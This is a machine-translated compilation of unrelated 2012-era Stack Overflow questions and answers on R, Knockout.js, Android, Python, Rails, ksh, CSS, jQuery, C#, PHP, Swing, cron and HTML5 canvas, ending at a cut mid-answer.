小提琴演示：http: [//jsfiddle.net/dharmavir/5yMZk/](http://jsfiddle.net/dharmavir/5yMZk/)

# r - R：表格格式化

> ID：11735192
> 
> 赞同：2
> 
> 时间：2012-07-31T07:28:13.990
> 
> 标签：r, dataframe

我有一个包含以下列的 excel 文件

```
Column1  Column2  Column3
ab        bb        0.5
ab        bc        0.1  
ab        cd        0.7
ab        dd        0.8
ac        bb        0.2
ac        bg        0.8
ac        ee        0.8
ac        dd        0.3

x <- data.frame (column1 = c("ab","ab","ab","ab","ac","ac","ac","ac"), 
                 column2 = c("bb","bc","cd","dd","bb","bg","ee","dd"),
                 column3 = c(0.5, 0.1, 0.7, 0.8, 0.2, 0.8, 0.8, 0.3)) 
```

我想改变它。

```
 ab   ac
bb  0.5  0.2
bc  0.1  
cd  0.7
dd  0.8  0.3
bg       0.8
ee       0.8 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T07:35:49.240

这个`reshape2`包是你的朋友：

```
require(reshape2)
dcast(x, column2 ~ column1, value.var="column3")
#   column2  ab  ac
# 1      bb 0.5 0.2
# 2      bc 0.1  NA
# 3      bg  NA 0.8
# 4      cd 0.7  NA
# 5      dd 0.8 0.3
# 6      ee  NA 0.8 
```

# 更新

由于@jmsigner 和我同时发布了几乎完全相同的答案，所以这是基本 R 中的一个选项，但这并没有给你带来那么好的输出：

```
reshape(x, direction="wide", idvar="column2", timevar="column1")
#   column2 column3.ab column3.ac
# 1      bb        0.5        0.2
# 2      bc        0.1         NA
# 3      cd        0.7         NA
# 4      dd        0.8        0.3
# 6      bg         NA        0.8
# 7      ee         NA        0.8 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T08:08:48.837

```
xtabs(column3 ~ column2+column1, data=x, sparse=TRUE)
6 x 2 sparse Matrix of class "dgCMatrix"
    ab  ac
bb 0.5 0.2
bc 0.1 .  
bg .   0.8
cd 0.7 .  
dd 0.8 0.3
ee .   0.8 
```

如果您不使用“稀疏”参数，则缺少的类别中将出现零。您可以将它们替换为 `is.na<-

```
xt <-  xtabs(column3 ~ column2+column1, data=x) 
is.na(xt) <- xt==0
xt
       column1
column2  ab  ac
     bb 0.5 0.2
     bc 0.1    
     bg     0.8
     cd 0.7    
     dd 0.8 0.3
     ee     0.8 
```

# javascript - 在淘汰赛 js 中深入了解 Ajax 样式

> ID：11735196
> 
> 赞同：1
> 
> 时间：2012-07-31T01:04:00.543
> 
> 标签：javascript, ajax

我正在构建一个 Web 应用程序，并希望将 UI 转换为使用 Knockout JS。我是淘汰赛的菜鸟，所以请善待！

通常我会加载一个员工列表（使用 PHP），然后如果选择了一个员工，我会使用 JQuery 找到该员工的 ID，然后对我的后端进行 AJAX 调用，填写结果框并将其向下滑动。

有没有办法在 Knockout 中复制这种行为？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-04-02T11:09:40.307

一个样板供您开始，使用 jQuery 和 Knockout。

[http://jsfiddle.net/5BHrc/6/](http://jsfiddle.net/5BHrc/6/)

**HTML**

```
<ul data-bind="foreach: employees">
    <li data-bind="css: {current: $data == $root.selected()}, click: $root.selected">
      #<span data-bind="text: id"></span> - <span data-bind="text: name"></span>
    </li>
</ul>
<div data-bind="slideVisible: ! loading(), html: employee_detail"></div> 
```

**CSS**

```
.current {
    background: blue;
    color: white;
}
ul>li {
    list-style: none;
} 
```

**JS**

```
$(function() {
    // for your requirment on sliding animation, this slideVisible is copied from http://knockoutjs.com/documentation/custom-bindings.html
    ko.bindingHandlers.slideVisible = {
        update: function(element, valueAccessor, allBindings) {
            var value = valueAccessor();
            var valueUnwrapped = ko.unwrap(value);
            var duration = allBindings.get('slideDuration') || 400;
            if (valueUnwrapped == true)
                $(element).slideDown(duration); // Make the element visible
            else
                $(element).slideUp(duration);   // Make the element invisible
        }
    };

    var vm = {
        employees: ko.observableArray([
            // build your initial data in php
            {id: 1, name: 'John'},
            {id: 2, name: 'Tom'},
            {id: 3, name: 'Lily'},
            {id: 4, name: 'Bob'}
        ]),
        selected: ko.observable(),  // a placeholder for current selected
        loading: ko.observable(false), // an indicator for ajax in progress
        employee_detail: ko.observable()  // holder for content from ajax return
    };

    // when user selects an employee, fire ajax
    vm.selected.subscribe(function(emp) {
        var emp_id = emp.id;

        // ajax starts
        vm.loading(true);

        $.ajax('/echo/html/?emp_id='+emp_id, {
            // just a simulated return from jsfiddle
            type: 'POST',
            data: {
                html: "<b>Employee #" + emp_id + "</b><p>Details, bla bla...</p>",
                delay: 0.2
            },

            success: function (content) {
                // update employee_detail
                vm.employee_detail(content);
            },
            complete: function() {
                // ajax finished
                vm.loading(false);
            }
        });
    });

    ko.applyBindings(vm);
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-01T21:46:38.390

[这听起来类似于本](http://learn.knockoutjs.com/#/?tutorial=webmail)淘汰教程中的文件夹和电子邮件的向下钻取。

# android - 如何隐藏apk的图像？

> ID：11735198
> 
> 赞同：5
> 
> 时间：2012-07-31T07:28:36.217
> 
> 标签：android, apk

我的应用程序的基本功能是显示图像。我可以在 PC 上提取 apk 包的内容。很容易看到包中的所有资产 - 其中包含的图像。我想隐藏这些图像。它们应该只在用户安装软件包的设备上运行时可见。

有什么办法可以解决这个问题吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T07:56:31.477

Well there is a way around for this stuff.

1.  Create an database with Image table in sql-light.
2.  Store All the Images in BLOB field.
3.  Present or database when user intsall the APK
4.  Read all the Images from DB and present on UI.
5.  When user un-install the app; Remove the DB as well.

I know this is big but this is secure way to secure your images and make APK.

Hope this helps

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T07:53:41.780

存储加密或以某种方式加扰的图像。

由于密钥必须在 APK 中，因此总是有可能被坚定的攻击者破解，所以不要为任何额外的强大而烦恼。带有密钥的简单密码足以阻止通常过度好奇的用户。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:01:37.967

另一种方法是为用户生成一个唯一标识符，然后在传递该唯一 ID 后从远程服务器下载图像。远程服务器读取唯一 ID 并根据该唯一 ID 以及您可能放入代码中的一些其他字符串加密文件。

# python - 如何打开新控制台并运行 python 脚本

> ID：11735203
> 
> 赞同：0
> 
> 时间：2012-07-31T07:28:51.803
> 
> 标签：python, bash, sublimetext2

这是我的问题：从命令行（bash）运行 python 脚本时，我想打开一个新的控制台窗口，运行我的 python 脚本并最终进入交互式 python shell。是否有捷径可寻？

背景：现在，我正在通过与 numpy 一起开发一个简单的 python 脚本来探索 sublime text 2。当我从 sublime 中运行 build 时，脚本会被执行，但我无法与结果进一步交互。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T07:48:29.453

您应该考虑使用[iPython](http://ipython.org)，从那里您可以运行脚本、与变量交互等等。

您提到您使用 NumPy，iPython 是针对科学/数值分析用户的。

如果你有空闲时间，你应该尝试安装 iPython notebook，在我看来，这是与 python 交互的最佳方式。

![在此处输入图像描述](../Images/f30bf4384f5e8a6be13ea8d16a306ae2.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T07:57:31.870

If you're using python 3.2 you can use the python debugger. At the beginning of your project, `import pdb`. Then at the point that you want to enter interactive mode, type `pdb.set_trace()`. (You have to put the trace one line above the last line, otherwise the program will finish and restart.) I don't know how to make it automatically enter interactive mode, but when the program gets to the trace the console will enter the debugger. You can then type `interact`, and press Enter, and you will be in interactive mode, with all your variables preserved.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T07:37:48.770

[`code`](http://docs.python.org/library/code.html)您可以使用该模块在当前控制台中打开 REPL 。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T07:52:43.967

您是否要创建一个窗口出现..？

你可以试试这个：

*   你应该下载 pygame 以及你的 python 版本

您必须导入 pygame & sys 以退出系统，然后从 pygame.locals 导入。这是脚本

```
import pygame, sys
from pygame.locals import *

pygame.init()
window = pygame.display.set_mode((x, y)) # use the integer of Width(x) & Height(y) of the window
pygame.display.set_caption('Blank Window')

while True : # game event loop
    for event pygame.event.get(): # we used this, so the window won't 'hang' if we wanna quit the window (event is a variable name so you can named it as you like it)
     if event.type == QUIT:
       pygame.quit()
       sys.exit()
pygame.display.update() # this's for the update of the script 
```

这就是我所知道的... ^_^ 抱歉我犯了任何错误.. 你应该随时问我.. 但我更喜欢你向专家提出这个问题... 我认识一个人，如果您想了解更多，请尽快回复我..

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-31T14:59:22.633

这很明显:) 我需要打开一个新的 gnome-terminal 或类似的东西：

```
gnome-terminal -e "python -i foo.py" 
```

因此，生成的 sublime 配置文件看起来像这样

```
}
    "cmd": ["gnome-terminal", "-e", "python -i $file"],
    "file_regex": "^[ ]*File \"(...*?)\", line ([0-9]*)",
    "selector": "source.python"
} 
```

在 sublime 中按 Ctrl + B 现在会打开一个新的控制台窗口，执行我的脚本并将我留在交互式 python shell 中。

仍然存在一个小问题，这似乎不适用于 glumpy。不知道为什么。

# ruby-on-rails - 带有rails3的邮件中的图像附件

> ID：11735204
> 
> 赞同：0
> 
> 时间：2012-07-31T07:28:53.287
> 
> 标签：ruby-on-rails, ruby, actionmailer

这里我需要用邮件附上一张图片，像这样传递的图片

```
**imageurl** = "https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=%22hai%22&choe=UTF-8"

class UserMailer < ActionMailer::Base
 default :from => "mail@example.com"

 def welcome_email(**imageurl**,bname,mailid)
  **attachments['image.png'] = File.read(imageURL)**
  mail(:to => mailid,
  :subject => "Code for "+bname+"",
  :body => "code for bname" )
  end
 end
end 
```

在这里我遇到了一些附件错误。这个附件有什么变化吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T07:39:02.000

我认为您有一个 URL，即 File.read 无法读取的字符串。

```
require 'open-uri'
class UserMailer < ActionMailer::Base
  def welcome_email(image_url,bname,mailid)
    attachments['image.png'] = open(URI.parse(image_url))
    ...
  end
end 
```

以上应该可以解决我认为的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T07:53:27.657

```
require 'open-uri'
class UserMailer < ActionMailer::Base
  def welcome_email(image_url,bname,mailid)
    mail.attachments[image.png] = { :mime_type => type*, :content => open(URI.parse(image_url)}
    ...
  end
end 
```

其中 type* 是附件的类型，在您的情况下它将是 ('image/png')

# ruby-on-rails - 通过终端测试 Rails 嵌套表单 POST

> ID：11735206
> 
> 赞同：2
> 
> 时间：2012-07-31T07:28:53.910
> 
> 标签：ruby-on-rails, ruby, post, nested-forms

我创建了嵌套表单并想从终端对其进行测试。如何发出 POST 请求以一次创建 2 条记录 - 一条用于父项，一条用于子项？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:33:51.343

[撬](https://github.com/pry/pry/)可以帮忙。这不是“测试”，而是终端中的更多“调试”。

```
gem 'pry'
bundle install 
```

在您接受发布请求的操作开始时，假设创建；

```
def create
  binding.pry
  ...
end 
```

浏览器不会响应，但你会在终端中得到你想要的。

有关更多信息，请参阅[此 railscast](http://railscasts.com/episodes/280-pry-with-rails)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:52:43.400

HTTP 方面的嵌套表单与常规表单没有什么不同。Rails 使用字段的命名来区分父数据和子数据。使用浏览器的检查器检查手动填写表单时发送的 HTTP 请求。从那里，您可以看到所有使用的字段的名称。然后，在终端中，您通常可以执行以下操作：

```
curl --data "parent[foo]=1&child[bar]=2" http://myapp.dev/parent/create 
```

只需将 parent[foo] 和类似内容替换为您在检查器中找到的内容，它应该都可以工作。如果您想查看请求中的潜在错误，请跟踪开发日志。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-07-31T08:52:34.687

如何使用 rspec 测试框架？

# unix - 使用 ksh 和 uptime 获取最后五分钟的平均负载

> ID：11735211
> 
> 赞同：3
> 
> 时间：2012-07-31T07:29:09.327
> 
> 标签：unix, cpu-usage, ksh, uptime

对于 CPU 平均负载的想法，我`uptime`在`ksh`脚本中使用：

```
uptime | awk '{print $11}' | sed '$s/.$//' | read CPU 
```

然后我稍后在其中使用该变量`CPU`。

该`$11`部分是隔离**最后五分钟**的部分。但是，我今天注意到这不起作用。具体来说，最后五分钟部分以`$9`. 该函数返回的参数更少。这是因为机器最近重新启动，因此`uptime`显示自重新启动后的分钟数而不是天数和分钟数。

有没有办法让我始终只获得正常运行时间的最后五分钟？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-05-22T09:06:10.360

```
cut -d ' ' -f2 /proc/loadavg 
```

/proc/loadvg 是 uptime、w、who 和其他数据的来源。它有一个更简单的格式，数字总是在小数部分前有一个点（正常运行时间等使用当前的语言环境，所以你可能会发现类似

平均负载：0,18, 0,26, 0,30

哪些更难解析

plus 的速度快得令人难以置信！;-)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T08:10:37.867

尝试将“Load Average”之前的文本分开，然后`awk`在剩余部分使用。

```
uptime | sed 's/.*load average: //' | awk -F\, '{print $2}' 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T22:18:09.240

阅读第 2 个到最后一个字段而不是第 9 个或第 11 个字段可能更简单：

```
uptime | awk '{print $(NF-1)}' FS=, 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T16:36:29.580

这个小 shell 函数应该与 bash 或 ksh(93) 一起使用

```
 function loadavg {
        typeset minutes=$1 t1=$(uptime)
        echo ${t1#*load average: } | (
            IFS=', ' && read L1 L5 L15
            case $minutes in
            (1)  echo $L1;;
            (5)  echo $L5;;
            (15) echo $L15;;
            ("") echo $L1 $L5 $L15;;
            (*)  echo "usage: loadavg [ 1 | 5 | 15 ]" 1>& 2
            esac                
        )
    } 
```

解释：

此代码使用 IFS 将 "load average:" 之后的字符串拆分为三个字段。'typeset' 和 subshel​​l 将函数变量与其他 shell 变量隔离开来。

下面简化了结果，只返回原始问题的答案：

```
function load5 {
    typeset t1=$(uptime)
    echo ${t1#*load average: } | (
        IFS=', ' && read L1 L5 L15
        echo $L5            
    )
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-15T06:47:47.563

这可以给你最好的结果我用它来得到我每 5 分钟的平均负载：

$ 正常运行时间 | awk '{ 打印 $11 }'| tr -d ','

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-08-24T21:11:30.817

所以，我在编写一个在 Linux 和 Mac OS X 上都可以运行的程序时遇到了麻烦。经过一番斗争，我想出了这个：

```
uptime | sed 's/.*load average[s]*://' | awk '{print $3}' 
```

希望这对某人有帮助。

# android - 软键盘按两次空格后如何插入点“.”？

> ID：11735212
> 
> 赞同：0
> 
> 时间：2012-07-31T07:29:12.613
> 
> 标签：android, android-softkeyboard

在`EditText`按两次 Space 之后。

我怎样才能`.`在我的`EditText`.

健康）状况：-

1-如果`EditText`为空“ `.`”点不应插入。

2-如果`EditText`只包含一些字符串，`.`则应插入“”点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T07:31:26.547

您可以为您的 EditText 实现[TextWatcher](http://developer.android.com/reference/android/text/TextWatcher.html)以监视输入。

在里面，**`onTextChanged()`**方法，你可以像上面提到的那样进行编码。

# html - 处理表中的溢出行数据

> ID：11735216
> 
> 赞同：0
> 
> 时间：2012-07-31T07:29:17.750
> 
> 标签：html, css, html-table

我的网页中有一个 HTML 表格，其中可能有很多行，因为它是动态生成的。我面临的问题是，当行数据溢出可用宽度时，整个表格 css 都会受到干扰。

我需要一个解决方案，如果行数据溢出，它应该分成多行，以适应所有数据。

HTML如下：

```
<table>
<tr>
<td class='first' >From :</td>
<td class='second'>Gaurav Sachdeva &lt;gauravs23@ymail.com&gt;</td>
</tr>
<tr>
<td class='first' >To :</td>
<td class='second' >nerdsachdeva@gmail.com
   &lt;nerdsachdeva@gmail.com&gt;nerdsachdeva@gmail.com
   &lt;nerdsachdeva@gmail.com&gt;nerdsachdeva@gmail.com
   &lt;nerdsachdeva@gmail.com&gt;nerdsachdeva@gmail.com
   &lt;nerdsachdeva@gmail.com&gt;</td>
</tr>
<tr>
<td class='first'>Date :</td>
  <td class='second'>Sun, 1 Jul 2012 18:30:48 +0800 (SGT)</td>
</tr>
</table> 
```

CSS如下：

```
.first{
font-size:14px;
text-align:right;
font-weight:bold;
color: grey;
}
.second{
padding-left:10px;
font-size:14px;
font-weight: bold;
color:    black;
} 
```

所有的css大师都在那里....请帮忙！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:04:17.703

我看到的问题实际上是“From :”和“To :”和“Date :”可能各自分成两行。要解决此问题，请添加

```
.first { white-space: nowrap; } 
```

要解决您没有询问的另一个布局问题，请考虑添加以下内容：

```
td { vertical-align: top; } 
```

如果数据中的电子邮件收件人列表确实是示例中的格式，那么它会有点奇怪并且会呈现奇怪，因为浏览器可以在任何空格处插入换行符，但不能在“>”之后。用逗号或分号和空格分隔地址更为正常。如果不能使用空格，实际的选择是`<wbr>`在允许的断点处插入标签，如`John Doe <foo@example.com><wbr>Jane Doe <bar@example.com>`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T07:39:11.943

只需将其替换`css`为以下一个或设置宽度为你`Table`我可以看到那里为`Width`你的桌子定义。`Width`可以解决问题

```
.first
{
font-size:14px;
text-align:right;
font-weight:bold;
color: grey;
}

.second
{
padding-left:10px;
font-size:14px;
font-weight: bold;
color:    black;
overflow:hidden;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:15:16.403

好的，现在在这里检查

```
<style>
.first{
font-size:14px;
text-align:right;
font-weight:bold;
color: grey;

}
.second{
padding-left:10px;
font-size:14px;
font-weight: bold;
color:    black;
    overflow:hidden;
}

</style>
<table cellspacing="5px" cellpadding="5px" style="width:525px;">
<tr>
<td class='first' style="width:57px;">From :</td>
<td class='second'>Gaurav Sachdeva &lt;gauravs23@ymail.com&gt;</td>
</tr>
<tr>
<td class='first' style="width:57px;">To :</td>
<td class='second' >nerdsachdeva@gmail.com
   &lt;nerdsachdeva@gmail.com&gt;nerdsachdeva@gmail.com
   &lt;nerdsachdeva@gmail.com&gt;nerdsachdeva@gmail.com
   &lt;nerdsachdeva@gmail.com&gt;nerdsachdeva@gmail.com
   &lt;nerdsachdeva@gmail.com&gt;</td>
</tr>
<tr>
<td class='first' style="width:57px;">Date :</td>
  <td class='second'>Sun, 1 Jul 2012 18:30:48 +0800 (SGT)</td>
</tr>
</table> 
```

# jquery - jQuery：如何组合两个事件：$(document).ready + $("#superid a").hover？

> ID：11735219
> 
> 赞同：3
> 
> 时间：2012-07-31T07:29:25.893
> 
> 标签：jquery, events

我的问题很简单。我不知道如何组合两个执行相同功能的事件。

```
$(document).ready(function()
{
//do something
}); 
```

+

```
$("#superid a").hover(function()
{
//do something the same
}); 
```

如何结合它？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-31T07:32:11.333

如果我很好理解

```
$(document).ready(function() {

   var yourfunction = function() {
      // do something
   }

   $("#superid a").hover(function() {
      yourfunction();
   });

   yourfunction();
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T07:33:00.253

创建一个新函数并将其作为回调传递给两个事件。

```
function myAction() { ... }
$(document).ready( myAction );
$( ... ).hover( myAction ); 
```

# c# - 我可以在树视图中获取插入节点的索引吗？

> ID：11735220
> 
> 赞同：0
> 
> 时间：2012-07-31T07:29:29.337
> 
> 标签：c#, treeview, treenode

在我的树视图中，我想记住在删除或插入节点后扩展了哪些节点并重绘了该状态。我通过记住扩展节点的索引解决了这个问题。如果删除了一个节点，我会减少之后的所有 indeces。这很有效，因为我可以使用 treeView.SelectedNode 访问已删除的节点，但是如何获取插入节点的新索引？我无法通过保存对节点或名称或标签的引用来解决它，因为当我重绘树时，节点是全新创建的 - 我想我无论如何都无法获得对新创建节点的引用最好的问候，期待

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T07:53:33.483

我的方式：使用你自己声明的类：

```
class TreeNodeEx : TreeNode
{
    public void Remove()
    {
        base.Remove();
        // what you want to do
        UpdateNode(this.Parent);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:52:24.307

您可以将 observableCollection 绑定到您的 TreeNode Then ：

```
 var obd =  Observable.FromEvent<NotifyCollectionChangedEventArgs>(
            ev => obdCollection.CollectionChanged += CheckChanges,ev=> obdCollection.CollectionChanged -= CheckChanges);

   private void CheckChanges(object sender, NotifyCollectionChangedEventArgs e)
    {
        Console.WriteLine("new Starting index : "+e.NewStartingIndex);
        Console.WriteLine("Old Starting index : " + e.OldStartingIndex);
        Console.WriteLine("new Items : " + e.NewItems);
        Console.WriteLine("Old Items : " + e.OldItems);

    } 
```

这样您就可以检查集合中发生了什么变化。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T11:52:04.910

答案并不是我真正想要的，但是在我发现插入“AfterSelect”事件后，我这样做了：

```
private void treeViewProduct_AfterSelect(object sender, TreeViewEventArgs e)
    {

        if (insertMode)
        {

            treeViewProduct.NotifyAboutInsert(e.Node.Index);
        }
...
} 
```

然后我的树视图处理节点的更改索引，并完美地重绘树。

# android - 没有在列表视图上获得点击事件

> ID：11735230
> 
> 赞同：0
> 
> 时间：2012-07-31T07:30:03.710
> 
> 标签：android

这是我的点击列表...

```
mListView.setOnItemClickListener(new OnItemClickListener() {

        @Override
        public void onItemClick(AdapterView<?> arg0, View arg1, int arg2,
                long arg3) {
        Log.i("", "adfadf");
        Toast.makeText(ScoreListActivity.this, "Clicked",Toast.LENGTH_SHORT).show();

        }
    }); 
```

这段代码有什么问题....\

当我单击 LISTVIEW 的一个项目时，我没有得到单击...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T07:32:49.433

在创建列表项时调用以下代码：

```
listItem.setDescendantFocusability(FOCUS_BLOCK_DESCENDANTS); 
```

# php - 复选框组 - 只有第一个更改值

> ID：11735234
> 
> 赞同：0
> 
> 时间：2012-07-31T07:30:14.483
> 
> 标签：php, javascript, html

我有一个我正在尝试解决的问题。我在互联网上搜索，但没有任何帮助。我有多组复选框，我想获取它们的值并将它们传递到数据库中。问题是只有 group 的第一个复选框获得正确的值。这是我的代码：

html代码：

```
<tr>
        <th>Δημοτικός Κήπος</th>
        <td align="center">
            <span style="display:none;">
                <input type="checkbox" name="place1[]" value="1" id="place1_1"/>
            </span>
            <img id="Imageplace1_1" 
            src="unchecked.jpg" 
            width="35" 
            height="35" 
            onclick="CheckBoxClicked('place1_1')" 
            style="cursor:pointer;"/>
        </td>
        <td align="center">
            <span style="display:none;">
                <input type="checkbox" name="place1[]" value="2" id="place1_2"/>
            </span>
            <img id="Imageplace1_2" 
            src="unchecked.jpg" 
            width="35" 
            height="35" 
            onclick="CheckBoxClicked('place1_2')" 
            style="cursor:pointer;"/>
        </td>
        <td align="center">
            <span style="display:none;">
                <input type="checkbox" name="place1[]" value="3" id="place1_3"/>
            </span>
            <img id="Imageplace1_3" 
            src="unchecked.jpg" 
            width="35" 
            height="35" 
            onclick="CheckBoxClicked('place1_3')" 
            style="cursor:pointer;"/>
        </td>
        <td colspan="2" align="center">
            <span style="display:none;">
                <input type="checkbox" name="place1[]" value="4" id="place1_4"/>
            </span>
            <img id="Imageplace1_4" 
            src="unchecked.jpg" 
            width="35" 
            height="35" 
            onclick="CheckBoxClicked('place1_4')" 
            style="cursor:pointer;"/>
        </td>
    </tr> 
```

php代码：

```
 if(isset($_POST['answeres'])) {
        $place1[0] = (@$_POST['place1'][0]=='1')? $_POST['place1'][0]:'0';
        $place1[1] = (@$_POST['place1'][1]=='1')? $_POST['place1'][1]:'0';
        $place1[2] = (@$_POST['place1'][2]=='1')? $_POST['place1'][2]:'0';
        $place1[3] = (@$_POST['place1'][3]=='1')? $_POST['place1'][3]:'0';
        echo $place1[0]; //I get 1 if checked 0 if unchecked
        echo $place1[1]; //I get 0 all the time
        echo $place1[2]; //I get 0 all the time
        echo $place1[3]; //I get 0 all the time
    } 
```

javascript代码：

```
var CheckBoxCheckedImage = new Image();
var CheckBoxUncheckedImage = new Image();

CheckBoxCheckedImage.src = "checked.jpg";
CheckBoxUncheckedImage.src = "unchecked.jpg"; 

function CheckBoxClicked(CheckBoxid) {

    if(document.getElementById(CheckBoxid).value == "on"){
    //if(document.getElementById(CheckBoxid).checked) {
        document.getElementById(CheckBoxid).checked = false;
        document.getElementById("Image"+CheckBoxid).src = CheckBoxUncheckedImage.src;
    }
    else{
        document.getElementById(CheckBoxid).checked = true;
        document.getElementById("Image"+CheckBoxid).src = CheckBoxCheckedImage.src;     
    }
} 
```

任何人都可以帮忙吗？我想不通……

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:23:22.747

2个错误：

1) 在您的 PHP 中，您检查复选框的值是否为`1`，但在您的 HTML 中，复选框的值为`1`, `2`, `3`, `4`。`1`因此，要么在 HTML中将复选框的值全部设置为，要么`1`在`4`PHP 中进行检查 - 取决于您想要什么以及您决定如何解决第二个错误。

2) 当复选框被发布时，只有那些复选框是`$_POST`被选中的数组的一部分。这意味着这`$_POST['place1'][0]`将是第**一个选中**的复选框，而不一定是表单中具有该名称的第一个复选框。您可以通过使用复选框名称（等）中的键或通过为每个复选框使用不同的值并检查值而不是键来解决此问题`name="place1[0]"`（`name="place1[1]"`提示：查看[`in_array()`](http://www.php.net/in_array)，[`array_values()`](http://www.php.net/array_values)）

其他提示：

*   使用`print_r($_POST);`所以查看实际发布到 PHP 脚本的内容 - 使调试更容易。
*   不要`@`用来抑制错误/通知：它很慢。这是糟糕的编码（应该避免错误，应该注意通知 - 而不是压制它们）。

# java - swing：在 BoxLayout 中对齐 JPanel

> ID：11735237
> 
> 赞同：1
> 
> 时间：2012-07-31T07:30:23.927
> 
> 标签：java, swing

我有一个 JPanel ( `panel`)，其布局设置为 BoxLayout。我还有一个自定义类`MapRow`，它扩展了 JPanel（并在其中包含一些简单的 FlowLayout 组件），我希望以简单的左对齐自上而下的方式添加`MapRow`to的实例。`panel`考虑以下方法：

```
public void drawMappingsPanel(JPanel panel) {
        panel.setLayout(new BoxLayout(panel, BoxLayout.PAGE_AXIS));

        int s = /* aMethodCall() */;
        for (int i = 0; i < s; i++) {
            MapRow row = new MapRow();
            row.setAlignmentX(LEFT_ALIGNMENT);
            panel.add(row);
        }
    } 
```

但是，当我运行代码时，所有`MapRow`面板都居中对齐，如下所示：

![在此处输入图像描述](../Images/db71877f237be1eb0d6c5bcefe900e54.png)

如何将`MapRow`面板向左对齐？`setAlignmentX(LEFT_ALIGNMENT)`方法好像不行。。。

**编辑：**`MapRow`我刚刚用 dummy s替换了实例`JButton`，它们左对齐都很好。所以像`JButton`s 这样的组件可以使用 左对齐`setAlignmentX()`，但是 JPanels 不能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:31:02.563

You should use a LEFT-alignement for you FlowLayout in MapRow. Here is a small [SSCCE](http://SSCCE.org) illustrating that:

```
import java.awt.Color;
import java.awt.FlowLayout;

import javax.swing.BorderFactory;
import javax.swing.BoxLayout;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.SwingUtilities;

public class TestJPanels {

    protected void initUI() {
        final JFrame frame = new JFrame(TestJPanels.class.getSimpleName());
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        JPanel panel = new JPanel();
        panel.setLayout(new BoxLayout(panel, BoxLayout.PAGE_AXIS));
        for (int i = 0; i < 5; i++) {
            JLabel label = new JLabel("Label-" + i);
            label.setBorder(BorderFactory.createLineBorder(Color.GREEN));
            JPanel insidePanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
            insidePanel.add(label);
            insidePanel.setBorder(BorderFactory.createLineBorder(Color.RED));
            panel.add(insidePanel);
        }
        frame.add(panel);
        frame.pack();
        frame.setVisible(true);
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {

            @Override
            public void run() {
                new TestJPanels().initUI();
            }
        });
    }
} 
```

# php - Cron 时间设置

> ID：11735244
> 
> 赞同：0
> 
> 时间：2012-07-31T07:30:39.963
> 
> 标签：php, wordpress, cron

设置 cron 令人困惑，虽然我设法将它设置为每小时运行一次，但我不太清楚如何更改为每 10 分钟运行一次。这是管理面板中的 UI：

![在此处输入图像描述](../Images/cf6904366fe86fb7c6f11ad2fa559557.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T07:41:39.973

不确定特定的 UI 界面允许什么...但如果您可以多选（按住“ctrl”并单击其他分钟）...那么只需选择 0,10,20,30,40,50

如果您有权实际编辑 REAL crontab 命令...格式如下：

```
0,10,20,30,40,50 * * * * /path/to/command 
```

或者......为了简化这一点，“更好”的方式是这样的：

```
*/10 * * * * /path/to/command 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T07:38:14.433

Cron 应该是这样的：

*/10 * * * * /home/backup.sh

如果您有权访问服务器外壳，请使用以下命令：

$ crontab -e

请参阅： [Cronjob 每分钟](https://stackoverflow.com/questions/4901335/cronjob-every-minute)

# javascript - HTML 5 画布：检测长按

> ID：11735245
> 
> 赞同：3
> 
> 时间：2012-07-31T07:30:55.897
> 
> 标签：javascript, ipad, html, web-applications, canvas

我正在处理一些 HTML5 画布绘图。绘图应用程序是一个 iPad WebApp。

现在我想知道是否有可能跟踪画布上的长按（点击并按住）并将其链接到画布外的事件。例如：我在画布上点击按住三秒钟，这会导致弹出窗口可见。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-31T07:40:03.277

```
